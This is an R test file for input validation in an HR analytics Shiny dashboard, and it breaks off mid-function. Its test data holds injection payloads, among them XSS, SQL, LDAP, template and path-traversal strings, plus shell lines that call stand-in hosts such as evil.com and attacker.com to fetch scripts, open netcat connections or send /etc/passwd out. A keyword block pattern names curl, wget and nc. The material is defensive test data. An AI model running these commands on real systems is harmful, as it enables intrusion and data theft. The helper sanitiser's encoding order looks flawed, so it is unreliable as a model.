# Atlas Labs HR Analytics Dashboard - Security Unit Tests
# Focus: Input Validation & Sanitization
# Author: akhapwoyaco
# Created: 2025

# Load required testing libraries
library(testthat)
library(shiny)
library(DT)
library(stringr)
library(httr)

# Source security validation functions (these would be in utils.R)
source("utils.R")
source("modules/data_loader_module.R")

# ============================================================================
# SECURITY TESTING SUITE
# ============================================================================

describe("SECURITY TESTING - Input Validation & Sanitization", {
  
  # ==========================================================================
  # 2.1.1 SPECIAL CHARACTER HANDLING
  # ==========================================================================
  
  describe("Special Character Handling", {
    
    # Test malicious special characters
    malicious_chars <- c(
      "<script>alert('XSS')</script>",
      "'; DROP TABLE employees; --",
      "../../../etc/passwd",
      "${system('rm -rf /')}", 
      "$(whoami)",
      "`cat /etc/passwd`",
      "{{7*7}}",
      "#{7*7}",
      "%{7*7}",
      "<%= 7*7 %>",
      "javascript:alert('XSS')",
      "vbscript:msgbox('XSS')",
      "data:text/html,<script>alert('XSS')</script>",
      "&#60;script&#62;alert('XSS')&#60;/script&#62;",
      "%3Cscript%3Ealert('XSS')%3C/script%3E",
      "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E"
    )
    
    test_that("sanitize_input handles malicious special characters", {
      for (char in malicious_chars) {
        result <- sanitize_input(char)
        
        # Should not contain script tags
        expect_false(grepl("<script", result, ignore.case = TRUE))
        expect_false(grepl("</script>", result, ignore.case = TRUE))
        
        # Should not contain SQL injection patterns
        expect_false(grepl("DROP TABLE", result, ignore.case = TRUE))
        expect_false(grepl("DELETE FROM", result, ignore.case = TRUE))
        expect_false(grepl("INSERT INTO", result, ignore.case = TRUE))
        expect_false(grepl("UPDATE.*SET", result, ignore.case = TRUE))
        
        # Should not contain command execution patterns
        expect_false(grepl("\\$\\(.*\\)", result))
        expect_false(grepl("`.*`", result))
        expect_false(grepl("\\${.*}", result))
        
        # Should not contain path traversal
        expect_false(grepl("\\.\\./", result))
        expect_false(grepl("\\.\\.\\\\", result))
        
        # Should not contain template injection patterns
        expect_false(grepl("\\{\\{.*\\}\\}", result))
        expect_false(grepl("\\{%.*%\\}", result))
        expect_false(grepl("<%.*%>", result))
      }
    })
    
    test_that("file upload validation rejects malicious filenames", {
      malicious_filenames <- c(
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "employee.csv.exe",
        "data.csv;rm -rf /",
        "file.csv`whoami`",
        "normal.csv\x00.exe",
        ".htaccess",
        "web.config",
        "employee.csv%00.php",
        "CON.csv", "PRN.csv", "AUX.csv", # Windows reserved names
        "NUL.csv", "LPT1.csv", "COM1.csv"
      )
      
      for (filename in malicious_filenames) {
        result <- validate_filename(filename)
        expect_false(result$valid, 
                    info = paste("Should reject malicious filename:", filename))
        expect_true(nchar(result$error_message) > 0)
      }
    })
    
    test_that("HTML encoding prevents XSS in output", {
      xss_payloads <- c(
        "<img src='x' onerror='alert(1)'>",
        "<svg onload='alert(1)'>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload='alert(1)'>",
        "<input onfocus='alert(1)' autofocus>",
        "<marquee onstart='alert(1)'>",
        "<video><source onerror='alert(1)'>",
        "<audio src='x' onerror='alert(1)'>",
        "<embed src='javascript:alert(1)'>",
        "<object data='javascript:alert(1)'>"
      )
      
      for (payload in xss_payloads) {
        encoded <- html_encode_output(payload)
        
        expect_false(grepl("<script", encoded, ignore.case = TRUE))
        expect_false(grepl("javascript:", encoded, ignore.case = TRUE))
        expect_false(grepl("onerror=", encoded, ignore.case = TRUE))
        expect_false(grepl("onload=", encoded, ignore.case = TRUE))
        expect_false(grepl("onfocus=", encoded, ignore.case = TRUE))
        
        # Should contain HTML entities
        expect_true(grepl("&lt;", encoded) || grepl("&gt;", encoded))
      }
    })
    
  })
  
  # ==========================================================================
  # 2.1.2 UNICODE ATTACK PREVENTION
  # ==========================================================================
  
  describe("Unicode Attack Prevention", {
    
    test_that("unicode normalization prevents homograph attacks", {
      # Cyrillic 'a' that looks like Latin 'a'
      cyrillic_a <- "\u0430"
      latin_a <- "a"
      
      # Greek 'o' that looks like Latin 'o'  
      greek_o <- "\u03BF"
      latin_o <- "o"
      
      # Mixed script attacks
      mixed_attacks <- c(
        paste0("admin", cyrillic_a), # admin with cyrillic 'a'
        paste0("g", greek_o, "ogle.com"), # google.com with greek 'o'
        "раура1.com", # paypal with cyrillic characters
        "аррӏе.com", # apple with mixed cyrillic
        "microsоft.com", # microsoft with cyrillic 'o'
        "\u0430dmin", # admin starting with cyrillic 'a'
        "аdministrator" # administrator with cyrillic 'a'
      )
      
      for (attack in mixed_attacks) {
        normalized <- normalize_unicode_input(attack)
        
        # Should be normalized to ASCII equivalents
        expect_false(grepl("[\u0080-\uFFFF]", normalized))
        
        # Should flag as suspicious
        is_suspicious <- detect_homograph_attack(attack)
        expect_true(is_suspicious, 
                   info = paste("Should detect homograph attack:", attack))
      }
    })
    
    test_that("unicode control characters are stripped", {
      control_chars <- c(
        "normal\u200Btext", # Zero-width space
        "text\u200Chere", # Zero-width non-joiner
        "some\u200Dtext", # Zero-width joiner
        "test\u2028line", # Line separator
        "para\u2029graph", # Paragraph separator
        "left\u202Eright", # Right-to-left override
        "text\u202Dhere", # Left-to-right override
        "file\uFEFFname", # Byte order mark
        "name\u061Ctext", # Arabic letter mark
        "test\u180Etext"  # Mongolian vowel separator
      )
      
      for (text in control_chars) {
        cleaned <- strip_unicode_controls(text)
        
        # Should not contain control characters
        expect_false(grepl("[\u200B-\u200F\u2028-\u202F\u061C\u180E\uFEFF]", cleaned))
        
        # Should preserve normal text
        expect_true(grepl("normal|text|here|line|graph|right|file|name", cleaned))
      }
    })
    
    test_that("unicode length validation prevents buffer overflow", {
      # Very long unicode strings that could cause issues
      long_unicode_strings <- c(
        paste(rep("\u1F600", 10000), collapse = ""), # 10k emoji
        paste(rep("\u0041\u0300", 5000), collapse = ""), # 5k combining chars
        paste(rep("\uD83D\uDE00", 8000), collapse = ""), # 8k surrogate pairs
        strrep("\U0001F4A9", 7000) # 7k pile of poo emoji
      )
      
      for (long_string in long_unicode_strings) {
        result <- validate_unicode_length(long_string, max_chars = 1000)
        expect_false(result$valid)
        expect_true(grepl("too long", result$error, ignore.case = TRUE))
      }
    })
    
    test_that("RTL/LTR override attacks are prevented", {
      rtl_attacks <- c(
        "filename\u202Etxt.exe", # RTL override to hide .exe
        "safe\u202Eexe.txt", # RTL to make exe look like txt
        "document\u202D\u202Epdf.scr", # Nested overrides
        "image\u202Ejpg.bat", # RTL override attack
        "video\u202Emp4.vbs" # RTL with script extension
      )
      
      for (attack in rtl_attacks) {
        cleaned <- remove_directional_overrides(attack)
        
        # Should not contain RTL/LTR overrides
        expect_false(grepl("[\u202D-\u202E]", cleaned))
        
        # Should flag as suspicious filename
        is_suspicious <- detect_rtl_attack(attack)
        expect_true(is_suspicious)
      }
    })
    
  })
  
  # ==========================================================================
  # 2.1.3 PATH TRAVERSAL PROTECTION
  # ==========================================================================
  
  describe("Path Traversal Protection", {
    
    test_that("directory traversal attempts are blocked", {
      traversal_attacks <- c(
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc//passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%5C..%5C..%5Cwindows%5Csystem32",
        "....\\\\....\\\\etc\\\\passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", # URL encoded
        "..%252F..%252F..%252Fetc%252Fpasswd", # Double URL encoded
        "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
        "/var/www/../../etc/passwd",
        "./../.../../etc/passwd",
        "\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "file:///etc/passwd",
        "file://c:\\windows\\system32\\config\\sam"
      )
      
      for (path in traversal_attacks) {
        result <- validate_file_path(path)
        expect_false(result$valid, 
                    info = paste("Should block traversal attack:", path))
        expect_true(grepl("path traversal|invalid path", result$error, ignore.case = TRUE))
      }
    })
    
    test_that("absolute paths are rejected", {
      absolute_paths <- c(
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\sam",
        "/root/.ssh/id_rsa",
        "D:\\sensitive\\data.txt",
        "/home/user/.bash_history",
        "\\\\server\\share\\file.txt",
        "file:///etc/hosts",
        "/proc/self/environ",
        "/dev/null",
        "C:\\pagefile.sys"
      )
      
      for (path in absolute_paths) {
        result <- validate_file_path(path)
        expect_false(result$valid)
        expect_true(grepl("absolute path|not allowed", result$error, ignore.case = TRUE))
      }
    })
    
    test_that("null byte injection in paths is prevented", {
      null_byte_attacks <- c(
        "safe.txt\x00.exe",
        "document.pdf\x00.bat",
        "image.jpg\x00.scr",
        "data.csv\x00.vbs",
        "report.html\x00.php",
        "config.json\x00/../../etc/passwd"
      )
      
      for (attack in null_byte_attacks) {
        cleaned <- remove_null_bytes(attack)
        expect_false(grepl("\x00", cleaned))
        
        result <- validate_file_path(attack)
        expect_false(result$valid)
      }
    })
    
    test_that("only allowed file extensions are accepted", {
      allowed_extensions <- c("csv", "txt", "json", "xlsx", "xls")
      
      test_files <- c(
        "employee.csv" = TRUE,
        "data.txt" = TRUE,
        "config.json" = TRUE,
        "report.xlsx" = TRUE,
        "old_data.xls" = TRUE,
        "script.exe" = FALSE,
        "malware.bat" = FALSE,
        "virus.scr" = FALSE,
        "backdoor.vbs" = FALSE,
        "shell.php" = FALSE,
        "page.html" = FALSE,
        "code.js" = FALSE,
        "style.css" = FALSE,
        "image.jpg" = FALSE,
        "document.pdf" = FALSE
      )
      
      for (filename in names(test_files)) {
        expected <- test_files[[filename]]
        result <- validate_file_extension(filename, allowed_extensions)
        expect_equal(result$valid, expected, 
                    info = paste("Extension validation failed for:", filename))
      }
    })
    
  })
  
  # ==========================================================================
  # 2.1.4 COMMAND INJECTION PREVENTION  
  # ==========================================================================
  
  describe("Command Injection Prevention", {
    
    test_that("shell metacharacters are sanitized", {
      command_injections <- c(
        "file.csv; rm -rf /",
        "data.txt && cat /etc/passwd",
        "report.xlsx || wget malicious.com/shell.sh",
        "employee.csv | nc attacker.com 1234",
        "data.txt`whoami`",
        "file.csv$(id)",
        "report.xlsx; powershell.exe -Command 'Get-Process'",
        "data.csv & del /f /s /q C:\\*.*",
        "file.txt; curl http://evil.com/steal?data=$(cat /etc/passwd)",
        "report.csv`python -c 'import os; os.system(\"rm -rf /\")'`"
      )
      
      shell_metacharacters <- c(";", "&", "|", "`", "$", "(", ")", "{", "}", 
                               "[", "]", "<", ">", "!", "?", "*", "~", "^")
      
      for (injection in command_injections) {
        sanitized <- sanitize_shell_input(injection)
        
        # Should not contain dangerous metacharacters
        for (metachar in shell_metacharacters) {
          expect_false(grepl(paste0("\\", metachar), sanitized, fixed = TRUE))
        }
        
        # Should not contain command keywords
        expect_false(grepl("\\b(rm|del|cat|wget|curl|nc|powershell|python|bash|sh|cmd)\\b", 
                          sanitized, ignore.case = TRUE))
      }
    })
    
    test_that("environment variable expansion is prevented", {
      env_attacks <- c(
        "$HOME/../../etc/passwd",
        "${PATH}/malicious",
        "$USER/../.ssh/id_rsa", 
        "%USERPROFILE%\\..\\..\\windows\\system32",
        "%TEMP%\\malicious.exe",
        "$PWD/../sensitive",
        "${SHELL}/../../../etc/shadow",
        "%APPDATA%\\..\\..\\windows\\system32\\config\\sam"
      )
      
      for (attack in env_attacks) {
        sanitized <- prevent_env_expansion(attack)
        
        # Should not contain environment variable patterns
        expect_false(grepl("\\$[A-Z_]+", sanitized))
        expect_false(grepl("\\$\\{[A-Z_]+\\}", sanitized))
        expect_false(grepl("%[A-Z_]+%", sanitized))
      }
    })
    
    test_that("process substitution is blocked", {
      process_substitutions <- c(
        "file.csv <(cat /etc/passwd)",
        "data.txt >(nc attacker.com 1234)",
        "report.xlsx <(wget evil.com/malware)",
        "employee.csv >(python -c 'malicious code')",
        "performance.csv <(curl -s http://evil.com/steal.sh | bash)"
      )
      
      for (substitution in process_substitutions) {
        result <- validate_process_substitution(substitution)
        expect_false(result$valid)
        expect_true(grepl("process substitution|not allowed", result$error, ignore.case = TRUE))
      }
    })
    
    test_that("regex injection in search patterns are prevented", {
      regex_attacks <- c(
        ".*(.)*", # Catastrophic backtracking
        "(a+)+b", # Exponential backtracking
        "([a-zA-Z]+)*", # Nested quantifier
        "((a|a)*)+", # Alternative backtracking
        "(a|a)*\\1", # Backreference attack
        "(?=.*(?=.*(?=.*a)))", # Nested lookahead
        "^(a+)+$", # Anchored catastrophic backtracking
        "([^x])*\\1", # Backreference with negation
        "()*", # Empty group quantifier
        "\\1(a)", # Invalid backreference order
        "(?#", # Incomplete comment
        "(?<name>", # Incomplete named group
        "[\\x{10000}-\\x{10FFFF}]" # Invalid Unicode range
      )
      
      for (regex in regex_attacks) {
        result <- validate_regex_pattern(regex)
        expect_false(result$valid)
        expect_true(grepl("invalid|dangerous|not allowed", result$error, ignore.case = TRUE))
      }
    })
    
  })
  
  # ==========================================================================
  # 2.1.5 LDAP INJECTION TESTING
  # ==========================================================================
  
  describe("LDAP Injection Testing", {
    
    test_that("LDAP special characters are escaped", {
      ldap_attacks <- c(
        "admin)(&(password=*))", # LDAP injection to bypass auth
        "*)(&(objectClass=*)", # Wildcard injection
        "user)(|(uid=*))", # OR injection
        "*)(&(|(cn=*)))", # Complex injection
        "admin\\00", # Null byte injection
        "user\\2A", # Escaped asterisk
        "*)(&(userPassword=*))", # Password field access
        "admin)(&(|(objectClass=person)(objectClass=*)))", # Object class enum
        "*)(objectClass=*))(&(cn=admin", # Parenthesis manipulation
        "user*)(&(|(memberOf=*)))" # Group membership enum
      )
      
      for (attack in ldap_attacks) {
        escaped <- escape_ldap_input(attack)
        
        # Should escape LDAP special characters
        expect_false(grepl("\\*", escaped) && grepl("\\(", escaped) && grepl("\\)", escaped))
        expect_false(grepl("&", escaped))
        expect_false(grepl("\\|", escaped))
        expect_false(grepl("\\\\", escaped) && nchar(gsub("\\\\", "", escaped)) != nchar(escaped))
      }
    })
    
    test_that("LDAP filter syntax validation", {
      invalid_filters <- c(
        "(&(cn=admin)", # Unbalanced parentheses
        "(cn=admin))", # Extra closing parenthesis  
        "(&)", # Empty AND filter
        "(|)", # Empty OR filter
        "(!(!))", # Double negation
        "(cn=)", # Empty attribute value
        "(=admin)", # Missing attribute
        "(cn~=admin)", # Invalid operator
        "(cn<=admin)", # Invalid comparison
        "(cn>=admin)", # Invalid comparison
        "(cn:=admin)", # Invalid extensible match
        "(&(cn=admin)(invalid))" # Invalid second condition
      )
      
      for (filter in invalid_filters) {
        result <- validate_ldap_filter(filter)
        expect_false(result$valid)
        expect_true(grepl("invalid|malformed|syntax", result$error, ignore.case = TRUE))
      }
    })
    
    test_that("LDAP DN injection prevention", {
      dn_attacks <- c(
        "cn=admin,ou=users,dc=company,dc=com)(|(objectClass=*))", 
        "cn=user\\2c ou=admins\\2c dc=company\\2c dc=com",
        "cn=test+uid=0,ou=users,dc=company,dc=com",
        "cn=admin,ou=users,dc=company,dc=com,cn=evil",
        "cn=user\\00,ou=users,dc=company,dc=com",
        "cn=admin),ou=users,dc=company,dc=com",
        "cn=user(objectClass=*),ou=users,dc=company,dc=com"
      )
      
      for (dn in dn_attacks) {
        sanitized <- sanitize_ldap_dn(dn)
        
        # Should not contain injection patterns
        expect_false(grepl("\\)\\(", sanitized))
        expect_false(grepl("objectClass", sanitized))
        expect_false(grepl("\\|", sanitized))
        expect_false(grepl("&", sanitized))
      }
    })
    
    test_that("LDAP attribute name validation", {
      invalid_attributes <- c(
        "objectClass=*", # Wildcard value
        "userPassword", # Sensitive attribute
        "cn;binary", # Binary flag
        "memberOf;range=0-*", # Range specifier
        "attribute with spaces",
        "attr-with-dashes-", # Invalid ending
        "123numericstart", # Can't start with number
        "attr_with_underscores_", # Invalid underscore usage
        "cn)", # Contains special char
        "uid(", # Contains special char
        "ou|pipe", # Contains pipe
        "dc&ampersand" # Contains ampersand
      )
      
      for (attr in invalid_attributes) {
        result <- validate_ldap_attribute(attr)
        expect_false(result$valid, 
                    info = paste("Should reject invalid attribute:", attr))
      }
    })
    
  })
  
  # ==========================================================================
  # INTEGRATION TESTS FOR SHINY MODULES
  # ==========================================================================
  
  describe("Shiny Module Security Integration", {
    
    test_that("data loader module handles malicious CSV content", {
      # Create temporary malicious CSV
      malicious_csv_content <- paste(
        "EmployeeID,FirstName,LastName,Salary",
        "1,<script>alert('XSS')</script>,Doe,50000",
        "2,Jane';DROP TABLE employees;--,Smith,60000",
        "3,Bob$(whoami),Johnson,55000",
        "4,Alice\x00Admin,Brown,70000",
        sep = "\n"
      )
      
      temp_file <- tempfile(fileext = ".csv")
      writeLines(malicious_csv_content, temp_file)
      
      # Test data loading with security validation
      result <- secure_load_csv(temp_file)
      
      expect_true(result$success)
      expect_true(all(sapply(result$data$FirstName, function(x) {
        !grepl("<script", x, ignore.case = TRUE) &&
        !grepl("DROP TABLE", x, ignore.case = TRUE) &&
        !grepl("\\$\\(", x) &&
        !grepl("\x00", x)
      })))
      
      unlink(temp_file)
    })
    
    test_that("filter inputs are properly sanitized", {
      malicious_filters <- list(
        department = c("HR'; DROP TABLE employees; --", "IT<script>alert(1)</script>"),
        salary_range = c("$(cat /etc/passwd)", "50000-60000"),
        employee_name = c("Admin\x00", "John Doe")
      )
      
      sanitized_filters <- sanitize_filter_inputs(malicious_filters)
      
      # Check department filter
      expect_false(any(grepl("DROP TABLE", sanitized_filters$department, ignore.case = TRUE)))
      expect_false(any(grepl("<script", sanitized_filters$department, ignore.case = TRUE)))
      
      # Check salary range filter  
      expect_false(any(grepl("\\$\\(", sanitized_filters$salary_range)))
      expect_true("50000-60000" %in% sanitized_filters$salary_range)
      
      # Check employee name filter
      expect_false(any(grepl("\x00", sanitized_filters$employee_name)))
      expect_true("John Doe" %in% sanitized_filters$employee_name)
    })
    
    test_that("report generation prevents template injection", {
      malicious_params <- list(
        title = "HR Report {{7*7}}",
        author = "Admin<%= system('whoami') %>",
        department = "IT#{File.read('/etc/passwd')}",
        date_range = "${exec('cat /etc/hosts')}"
      )
      
      sanitized_params <- sanitize_report_params(malicious_params)
      
      expect_false(grepl("\\{\\{.*\\}\\}", sanitized_params$title))
      expect_false(grepl("<%.*%>", sanitized_params$author))
      expect_false(grepl("#\\{.*\\}", sanitized_params$department))
      expect_false(grepl("\\$\\{.*\\}", sanitized_params$date_range))
    })
    
  })
  
  # ==========================================================================
  # EDGE CASES AND BOUNDARY TESTING
  # ==========================================================================
  
  describe("Edge Cases and Boundary Testing", {
    
    test_that("handles extremely large inputs", {
      # Test with very large strings
      large_input <- paste(rep("A", 1000000), collapse = "")
      result <- sanitize_input(large_input, max_length = 10000)
      
      expect_true(nchar(result) <= 10000)
      expect_true(result != large_input)
    })
    
    test_that("handles empty and null inputs", {
      inputs <- list(NULL, "", " ", "\t", "\n", "\r\n")
      
      for (input in inputs) {
        result <- sanitize_input(input)
        expect_true(is.null(result) || nchar(trimws(result)) == 0)
      }
    })
    
    test_that("handles mixed encoding attacks", {
      mixed_attacks <- c(
        "normal%41%42%43", # URL encoded ABC
        "test&#65;&#66;&#67;", # HTML entities ABC  
        "data\\u0041\\u0042\\u0043", # Unicode escapes ABC
        "file\\x41\\x42\\x43", # Hex escapes ABC
        "input\u2028newline", # Unicode line separator
        "text\u0000null" # Unicode null
      )
      
      for (attack in mixed_attacks) {
        decoded <- decode_all_encodings(attack)
        sanitized <- sanitize_input(decoded)
        
        # Should be safe after decoding and sanitizing
        expect_false(grepl("[\u0000-\u001F\u2028-\u2029]", sanitized))
      }
    })
    
    test_that("concurrent request handling maintains security", {
      # Simulate concurrent malicious requests
      malicious_inputs <- rep(list(
        "<script>alert('XSS')</script>",
        "'; DROP TABLE employees; --",
        "../../../etc/passwd"
      ), 100)
      
      # Process inputs concurrently (simulated)
      results <- parallel::mclapply(malicious_inputs, sanitize_input, mc.cores = 4)
      
      # All results should be sanitized
      for (result in results) {
        expect_false(grepl("<script", result, ignore.case = TRUE))
        expect_false(grepl("DROP TABLE", result, ignore.case = TRUE)) 
        expect_false(grepl("\\.\\./", result))
      }
    })
    
  })
  
})

# ============================================================================
# HELPER FUNCTIONS FOR SECURITY TESTING
# (These would typically be in utils.R)
# ============================================================================

# Input sanitization function
sanitize_input <- function(input, max_length = 1000) {
  if (is.null(input) || input == "") return(input)
  
  # Truncate if too long
  if (nchar(input) > max_length) {
    input <- substr(input, 1, max_length)
  }
  
  # Remove null bytes
  input <- gsub("\x00", "", input)
  
  # HTML encode special characters
  input <- gsub("<", "&lt;", input)
  input <- gsub(">", "&gt;", input)
  input <- gsub("&", "&amp;", input)
  input <- gsub("\"", "&quot;", input)
  input <- gsub("'", "&#x27;", input)
  
  # Remove SQL injection patterns
  input <- gsub("(?i)(DROP|DELETE|INSERT|UPDATE|SELECT)\\s+(TABLE|FROM|INTO|SET)", "", input, perl = TRUE)
  
  # Remove command injection patterns
  input <- gsub("[$`();|&<>]", "", input)
  
  # Remove path traversal
  input <- gsub("\\.\\.[\\/\\\\]", "", input)
  
  return(input)
}

# Filename validation
validate_filename <- function(filename) {
  if (is.null(filename) || filename == "") {
    return(list(valid = FALSE, error_message = "Filename cannot be empty"))
  }
  
  # Check for path traversal
  if (grepl("\\.\\.[\\/\\\\]", filename)) {
    return(list(valid = FALSE, error_message = "Path traversal detected"))
  }
  
  # Check for null bytes
  if (grepl("\x00", filename)) {
    return(list(valid = FALSE, error_message = "Null bytes not allowed"))
  }
  
  # Check for Windows reserved names
  reserved_